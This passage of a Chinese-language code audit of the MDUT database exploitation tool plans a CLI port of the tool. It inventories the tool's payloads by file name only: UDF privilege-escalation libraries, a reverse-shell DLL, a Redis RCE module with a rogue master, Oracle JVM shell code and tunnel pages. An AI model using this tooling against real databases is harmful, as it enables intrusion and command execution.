```
- 代码示例 JSON（MysqlHttpDao.java:47 注释）即一行完整记录。字段全部 TEXT；`findDataByid` 用 `String.format` 拼 id（ManagerDao.java:80，本地库风险低但建议参数化）。
- **CLI 二开含义**：可直接沿用该 schema（或改 JSON/YAML 存储）；注意密码/隧道密钥均明文落盘。

---

## F. 插件资源清单（文件名 + 大小；hex 载荷未读内容）

### F.1 Driver 目录（4 个 JDBC 驱动，动态加载）
| 文件 | 大小 |
|---|---|
| MDAT-DEV/src/main/Driver/mysql.jar | 2,428,323 B |
| MDAT-DEV/src/main/Driver/mssql.jar | 317,816 B（jTDS） |
| MDAT-DEV/src/main/Driver/oracle.jar | 4,210,517 B（ojdbc；pom 里只有 orai18n 字符集包） |
| MDAT-DEV/src/main/Driver/postgresql.jar | 1,005,347 B |

### F.2 Plugins 目录
| 路径 | 大小 | 用途（代码引用点） |
|---|---|---|
| Plugins/Mysql/udf_win32_hex.txt | 13,314 B | Win32 UDF DLL hex（MysqlDao.java:175） |
| Plugins/Mysql/udf_win64_hex.txt | 14,338 B | Win64 UDF DLL hex（MysqlDao.java:178） |
| Plugins/Mysql/udf_linux32_hex.txt | 11,394 B | Linux32 UDF SO hex（MysqlDao.java:186） |
| Plugins/Mysql/udf_linux64_hex.txt | 16,082 B | Linux64 UDF SO hex（MysqlDao.java:183） |
| Plugins/Mysql/udf_win_ex_hex.txt | 113,102 B | Windows 反弹 Shell 专用 DLL（含 backshell 函数，MysqlDao.java:376） |
| Plugins/Mssql/clr.txt | 2,165,760 B | MDATKit CLR 程序集 hex（MssqlDao.java:356；C# 源码在 MDUTSqlKit/MDATKit.zip 1,648,432 B） |
| Plugins/Oracle/ShellUtil.java | 4,746 B | Oracle JVM 命令执行/反弹 Shell Java 源（OracleDao.java:299） |
| Plugins/Oracle/FileUtil.java | 4,813 B | Oracle JVM 文件操作 Java 源（OracleDao.java:331） |
| Plugins/PostgreSql/9.0_linux_64_hex.txt | 20,832 B | PG 9.0 Linux64 UDF（PostgreSqlDao.java:387 拼名规则） |
| Plugins/PostgreSql/9.1_linux_64_hex.txt | 20,832 B | PG 9.1 Linux64 |
| Plugins/PostgreSql/9.2_linux_64_hex.txt | 20,832 B | PG 9.2 Linux64 |
| Plugins/PostgreSql/9.1_windows_32_hex.txt | 130,048 B | PG 9.1 Win32 |
| Plugins/PostgreSql/9.1_windows_64_hex.txt | 154,624 B | PG 9.1 Win64 |
| Plugins/PostgreSql/9.2_windows_32_hex.txt | 130,048 B | PG 9.2 Win32 |
| Plugins/PostgreSql/9.2_windows_64_hex.txt | 154,624 B | PG 9.2 Win64 |
| Plugins/Redis/exp.so | 38,336 B | Redis 主从 RCE 恶意模块（system.exec/system.rev） |
| Plugins/Redis/exp.so.1 | 44,320 B | 同上（另一版本副本） |
| Plugins/Redis/redis-cus-rogue.py | 1,884 B | 伪装 Redis master（响应 PING/REPLCONF/PSYNC，需用户在 VPS 自行运行） |
| Plugins/Template/mysql_tunnel.php | 1,641 B | MySQL HTTP 隧道服务端 |
| Plugins/Template/mssql_tunnel.aspx | 2,048 B | MSSQL 隧道服务端 |
| Plugins/Oracle/oracle_tunnel.jsp | 4,325 B | Oracle 隧道服务端 |
| Plugins/Template/postgresql_tunnel.php | 2,305 B | PostgreSQL 隧道服务端 |
| Plugins/Template/（空目录 Redis 无模板） | — | Redis 无 HTTP 隧道 |

**支持平台小结**：MySQL UDF = win32/win64/linux32/linux64；PostgreSQL UDF = 9.0/9.1/9.2 的 linux64 + 9.1/9.2 的 win32/win64（8.3、9.0 win 等版本无插件，UI 会提示"该版本尚未编译UDF或无法提权"，PostgreSqlDao.java:397-400；旧版 gcc4.2 编译的 8.2-8.4 列表被注释 :375-377）；MSSQL CLR 单一全功能程序集；Oracle 无二进制插件（纯 Java 源注入）。

---

## G. JavaFX 耦合点清单（决定 CLI 二开复用/剥离范围）

### G.1 完全耦合（CLI 需重写，不可复用）
| 文件 | javafx import 数 | 耦合内容 |
|---|---|---|
| main.java | 6 | `extends javafx.application.Application`、FXML、Stage（main.java:2-7,9-22）——入口需整体替换 |
| Controller/MainController.java | 12 | TableView/MenuItem/Alert/FXMLLoader（:8-19） |
| Controller/MssqlController.java | 14 | RadioButton/ToggleGroup/TreeView/TableView/ComboBox（:33-133 控件声明） |
| Controller/OracleController.java | 15 | TreeView/TableView/RadioButton/ComboBox |
| Controller/MysqlController.java | 10 | Button/TextArea/TextField/ComboBox |
| Controller/PostgreSqlController.java | 10 | 同上 |
| Controller/RedisController.java | 10 | 同上 |
| Controller/AddAndEditController.java | 8 | ChoiceBox/CheckBox + Platform.runLater（:6） |
| Controller/SettingController.java | 6 | CheckBox/FileChooser/Stage |
| Controller/TunnelGenerationController.java | 11 | ComboBox/FileChooser/Stage |
| Controller/UpdateController.java | 8 | **WebView**（:13,29，渲染 Markdown 更新日志）、Label/Button |
| Util/MessageUtil.java | 6 | 全部基于 Alert/TextArea/GridPane 的 GUI 弹窗（:3-8,23-83）——CLI 需替换为 stderr/日志 |
| Entity/FilesEntity.java | 2 | `ImageView`（文件图标）+ SimpleStringProperty（:3-4,12） |
| Entity/DatabaseDateEntity.java | 1 | SimpleStringProperty（:3,11-16，仅 TableView 绑定用，CLI 可换 POJO） |
| 10 个 FXML | — | resources/*.fxml 全部废弃 |

### G.2 中度耦合（**保留逻辑、剥离 UI 调用后可复用**——Dao 层）
所有 Dao 均 `import javafx.application.Platform`（各 1 处），并用 `Platform.runLater(...)` 包裹日志/弹窗；且持有 Controller 引用直写 TextArea：
- Dao/MysqlDao.java:20（import）、:50（持有 MysqlController）、:115,119,124,153,154,158…（runLater）
- Dao/MssqlDao.java:9,36 与全文 20+ 处 runLater；Dao/MssqlHttpDao.java:6,26
- Dao/OracleDao.java:9,44；Dao/OracleHttpDao.java:6,32
- Dao/PostgreSqlDao.java:9,45；Dao/RedisDao.java:7,21
- 改造建议：把 `Platform.runLater(() -> controller.xxxTextArea.appendText(...))` 与 `MessageUtil.showExceptionMessage` 统一收敛为一个 `Reporter` 接口（log/out/err），CLI 用 stdout 实现——Dao 内其余 JDBC/业务逻辑零改动。
- ⚠️ 另一隐性耦合：Dao 在 UI 线程外创建后 `getConnection()` 在 `initialize()` 的线程里被 `Platform.runLater` 包裹执行（如 MysqlController.java:107-112 把 HTTP Dao 构造也放进 runLater）——CLI 无此限制，可同步化。

### G.3 零 JavaFX、可直接复用（CLI 核心资产）
- `Util/MysqlSqlUtil.java`、`MssqlSqlUtil.java`、`OracleSqlUtil.java`、`PostgreSqlUtil.java`（全部 SQL 模板常量）
- `Util/Base64XOR.java`（118 行纯算法）
- `Util/Utils.java`（除 `openBrowse` :640-664 外；UA 池、随机串、hex、文件 IO、版本比较、headers 解析）
- `Util/OKHttpUtil.java`、`Util/HttpUtil.java`（网络层）
- `Util/YamlConfigs.java`（config.yaml 读写）
- `Dao/ManagerDao.java`（SQLite CRUD）
- `Plugins/Oracle/*.java`、`Plugins/Template/*`、`Plugins/**` 资源原样保留
- **注意**：pom.xml 未声明 JavaFX 依赖，说明原项目即依赖 JDK 8 自带 JavaFX 编译；剥离上述 UI 后，CLI 可在任意 JDK 8+ 用纯 Maven 编译。

---

## H. 更新 / 外联行为

1. **版本号**：`Utils.getCurrentVersion()` 硬编码返回 `"v2.1.1"`（Utils.java:134-136），无构建注入。
2. **检查更新**（仅用户点击"更新→检查更新"时触发，`Controller/UpdateController.java:95-127`）：
   - `Utils.checkVersion()` **GET `https://api.github.com/repos/SafeGroceryStore/MDUT/releases/latest`**（Utils.java:534-566），30s 超时，经 OKHttpUtil.getBodyWithGet（随机 UA）。
   - 解析 `tag_name` 与本地版本比较（`compareVersion` Utils.java:578-611）；有新版则取 `assets[0]` 的 `browser_download_url`/`name` 及 release body。
3. **下载更新**（`UpdateController.downloadAction` :61-85）：点击"下载"后 `HttpUtil.downloadFile(url, <jar目录>/<时间戳>-<文件名>)`（HttpUtil.java:611-658），完成后提示"请手动解压替换"——**不自动替换、不执行任何下载内容，无静默自更新**。
4. **自动更新**：SettingController 的 autoUpdate 选项被注释（SettingController.java:205,211）——不存在自动联网更新路径。
5. **其他外联**：
   - 文档菜单 `openBrowse("https://www.yuque.com/u21224612/nezuig")`（MainController.java:713-719，仅打开浏览器）；
   - 关于窗口展示 GitHub 地址（MainController.java:305-312）；
   - 其余全部网络行为（隧道 POST、代理、目标库连接）均为用户配置的"目标"；Redis 主从需用户自行在 VPS 运行 redis-cus-rogue.py（RedisDao.rogue 只做 slaveof）。
   - 本仓库 fork 自身即面向 CLI 改造：origin = `https://github.com/hanc00l/MDUT-cli`（git remote -v），最近提交 "Update ShellUtil.java"/"upgrade fastjson to 1.2.83"。
6. **CLI 二开建议**：`checkVersion` 可保留为 `--check-update` 子命令或直接删除；`Utils.getSelfPath()` 相关资源定位逻辑需保留（Driver/Plugins/data.db 依赖它）。

---

## I. 其他二开注意事项

1. **编码处理**
   - UI 提供 UTF-8/GB2312/GBK 三选一（MysqlController.java:136-143、MssqlController.java:249-256、OracleController/RedisController 同），执行结果按所选编码 `new String(rs.getBytes(...), code)` 还原（MysqlDao.java:298、PostgreSqlDao.java:210/233、RedisDao.java:240）。
   - **MSSQL 直连在空编码时默认 GB2312**（MssqlDao.java:102-104）；HTTP 通道传输层固定 UTF-8 bytes，仅最终解码按 code（Base64XOR.decode :70-78）。
   - Oracle 显式把 encoding 传进 `shellrun('exec',cmd,encoding)`（OracleSqlUtil.java:24），在目标库 JVM 内按该编码读进程输出（Plugins/Oracle/ShellUtil.java:45,58）。
   - config.yaml 与下载/写文件均强制 UTF-8（Utils.java:285、MainController.java:241）。
2. **异常处理**：Utils 注释宣称"Exception 全部往上层抛"（Utils.java:21），实际 Dao 层普遍 try-catch 吞掉后弹 GUI 窗（MessageUtil.showExceptionMessage，含完整堆栈 TextArea，MessageUtil.java:23-51）。CLI 化必须把这些调用点替换为日志接口，否则功能正常但用户无感知。错误字符串约定：`ERROR://` 前缀（隧道）、`Status | True`（成功）。
3. **日志方式**：`Utils.log()` 产出 `[*] yyyy-MM-dd HH:mm:ss - 信息\n`（Utils.java:223-228），原样 append 到各 Tab 的 TextArea。CLI 可原格式写 stdout；另有部分遗留 `System.out.println`（HttpUtil.java:69,99,110）。
4. **线程模型**：每个按钮动作 `new Thread(runner).start()` 并登记到 `workList`；窗口关闭时循环 `Thread.stop()` 强杀（MainController.java:452-470，已废弃 API，JDK20+ 不可用）。CLI 建议线程池 + 优雅取消。
5. **SQL 构造安全**：全部 `String.format` 拼接，仅对命令参数做 `'`→`''` 转义（如 MssqlDao.java:170,192,218,231）；无 PreparedStatement 参数化（ManagerDao 的 add/update 除外）。二次开发若开放脚本化输入需注意。
6. **路径/平台判断**：`splitDisk` 以是否含 `:` 判 Windows 并切盘符（Utils.java:489-502）——Linux 路径含冒号会误判；`splitHeaders` 要求严格 "K: V"（Utils.java:509-518），格式错误直接数组越界。
7. **已知小坑（移植时顺手修）**：
   - `MysqlDao.Option` 读 hex 文件未 `replace("\n","")`（MysqlDao.java:176/179/184/187），而 HTTP 版有（MysqlHttpDao.java:164-175）——文件带换行时直连版 dumpfile 会出错；
   - `regroupDrivers("ostgresql")` 拼写少 p（PostgreSqlDao.java:76,84，靠子串匹配侥幸可用）；
   - `RedisDao.CONN/dir/slaveReadOnlyFlag` 为 static（RedisDao.java:23-25）——多会话并发不安全，CLI 多标签场景需实例化；
   - `ManagerDao.findDataByid` 的 String.format 拼接（:80）；
   - OracleHttpDao 中 `getJobStatus` 用 `Thread.sleep(5000)` 轮询一次（OracleDao.java:254），不循环等待完成。
8. **依赖老化**：fastjson 1.2.83（本 fork 已升）、snakeyaml 1.28、jjwt 0.9.1、pegdown 1.6.0（停更）、commons-lang 2.6、okhttps 3.3.0。CLI 可整体替换为更现代栈，但注意 `org.json` 与 fastjson 混用（Dao 用 fastjson JSONObject，ManagerDao 用 org.json）。
9. **资源自包含**：Driver/Plugins/data.db/config.yaml 全部相对 jar 目录（`Utils.getSelfPath`），CLI 打包建议保持同构目录或改为 classpath 资源 + 可覆盖外部目录。
10. **免责声明**：启动时若 `Global.StartWarn=true` 弹用户协议，点不同意 `System.exit(0)`（MainController.java:158-175）——CLI 化可改为 `--i-agree` 参数或首次交互确认。
11. **功能对等核对结论**：CLI 版若完整保留 5 个直连 Dao + 4 个 HTTP Dao + TunnelGeneration 模板 + Plugins 资源 + config.yaml 机制，即可覆盖原 GUI 全部功能面（B/D 节矩阵即验收清单）；必须新写的只有：参数解析入口、Reporter 日志接口、MessageUtil 替代、Oracle 大小写不敏感的 job 状态轮询（可选优化）。
